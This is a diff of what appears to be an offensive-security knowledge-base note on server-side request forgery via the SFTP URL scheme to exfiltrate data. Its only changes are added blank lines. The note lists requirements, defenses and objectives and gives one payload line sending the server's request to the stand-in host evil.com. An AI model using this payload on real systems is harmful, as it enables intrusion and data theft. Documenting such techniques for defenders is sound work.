@@ -33,6 +33,8 @@ To execute this procedure, the attacker needs to have access to the web applicat
 
 Business value: An attacker can use this technique to exfiltrate sensitive data from a target environment without being detected by network filters. This can lead to loss of intellectual property, sensitive customer data, and financial loss.
 
+ 
+
 ## Requirements
 
 1. Access to the web application with a SSRF vulnerability
@@ -40,6 +42,8 @@ Business value: An attacker can use this technique to exfiltrate sensitive data 
 1. Knowledge of the target network
 
 1. Access to a destination that can be used to exfiltrate data
+
+ 
 
 ## Defense
 
@@ -49,17 +53,27 @@ Business value: An attacker can use this technique to exfiltrate sensitive data 
 
 1. Monitor network traffic for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Exfiltrate sensitive data from the target environment
 
 1. Bypass network filters and restrictions
 
+ 
+
 # Instructions
 
 1. To use this command, simply replace the URL parameter with the desired target address. This command can be used to perform server-side request forgery attacks over SFTP.
 
+ 
+
+
+
 **Code**: [[ssrf.php?url=sftp://evil.com:11111/]]
+
+
 
 > The URL parameter in this command specifies the address of the target server. By manipulating this parameter, an attacker can force the server to perform unintended actions or disclose sensitive information. In this case, the command is used to perform a server-side request forgery attack over SFTP, which can allow an attacker to access internal resources or perform other malicious actions.
 
@@ -79,3 +93,5 @@ Business value: An attacker can use this technique to exfiltrate sensitive data 
 - [[Server-Side Request Forgery]]
 - [[SFTP]]
 - [[SSRF exploitation via URL Scheme]]
+
+
